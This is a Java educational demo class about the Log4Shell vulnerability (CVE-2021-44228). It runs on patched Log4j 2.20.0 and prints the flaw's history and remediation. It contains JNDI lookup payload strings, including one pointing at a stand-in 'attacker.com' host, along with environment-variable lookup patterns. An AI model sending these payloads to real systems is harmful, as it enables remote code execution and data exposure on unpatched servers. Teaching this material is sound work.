package com.example.javaapp;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * EDUCATIONAL DEMO: This class demonstrates the Log4Shell vulnerability (CVE-2021-44228)
 * 
 * NOTE: This application uses Log4j 2.20.0 which is NOT vulnerable.
 * The patterns shown below are SAFE and will not execute on this version.
 * 
 * This is for educational/demonstration purposes only to show what the
 * Log4Shell vulnerability looked like in the vulnerable Log4j versions (2.0-2.14.1).
 * These exploit patterns do NOT work with Log4j 2.17.0+ or our version (2.20.0).
 */
public class VulnerableDemo {
    private static final Logger logger = LogManager.getLogger(VulnerableDemo.class);

    public static void main(String[] args) {
        logger.info("=== Log4Shell Vulnerability Demonstration (Educational) ===");
        logger.info("Using Log4j version 2.20.0 - SAFE from CVE-2021-44228");
        logger.warn("This demo shows patterns that WERE vulnerable in Log4j 2.0-2.14.1");
        
        // Simulate user input being logged (common vulnerability vector)
        String userInput = "${java:version}";
        logger.info("User input logged: {}", userInput);
        
        // More vulnerable patterns
        logger.info("System user: ${env:USERNAME}");
        logger.info("Java home: ${env:JAVA_HOME}");
        
        // The infamous Log4Shell exploit pattern (SAFE on Log4j 2.20.0)
        // This pattern WAS exploitable in Log4j 2.0-2.14.1
        logger.warn("Historical exploit pattern (safe on 2.20.0): ${jndi:ldap://example.com/a}");
        
        logger.info("=== SECURITY STATUS ===");
        logger.info("This application is using Log4j 2.20.0 which is SAFE:");
        logger.info("✅ NOT vulnerable to CVE-2021-44228 (Log4Shell)");
        logger.info("✅ NOT vulnerable to CVE-2021-45046");
        logger.info("✅ NOT vulnerable to CVE-2021-45105");
        logger.info("Version 2.20.0 is well above the safe threshold of 2.17.0+");
        
        displayVulnerabilityInfo();
    }
    
    private static void displayVulnerabilityInfo() {
        System.out.println("\n" + "=".repeat(70));
        System.out.println("CVE-2021-44228 (Log4Shell) - EDUCATIONAL INFORMATION");
        System.out.println("=".repeat(70));
        System.out.println("CURRENT STATUS: ✅ THIS APPLICATION IS SAFE (Log4j 2.20.0)");
        System.out.println("=".repeat(70));
        System.out.println("\nHistorical Vulnerability Information:");
        System.out.println("CVE ID: CVE-2021-44228 (Log4Shell)");
        System.out.println("Severity: CRITICAL (CVSS Score: 10.0)");
        System.out.println("Affected: Log4j 2.0-beta9 through 2.14.1");
        System.out.println("Fixed in: Log4j 2.17.0+");
        System.out.println("Description: Remote Code Execution via JNDI lookup");
        System.out.println("\nHow it worked (in vulnerable versions):");
        System.out.println("1. Attacker sends malicious input with JNDI lookup string");
        System.out.println("2. Log4j processes the input and performs JNDI lookup");
        System.out.println("3. Remote code is downloaded and executed");
        System.out.println("\nExample exploit pattern (SAFE on 2.20.0):");
        System.out.println("   ${jndi:ldap://attacker.com/malicious}");
        System.out.println("\nRemediation applied:");
        System.out.println("✅ Upgraded to Log4j 2.20.0");
        System.out.println("✅ JNDI lookups disabled by default in safe versions");
        System.out.println("✅ No additional mitigation flags needed");
        System.out.println("=".repeat(70) + "\n");
    }
}
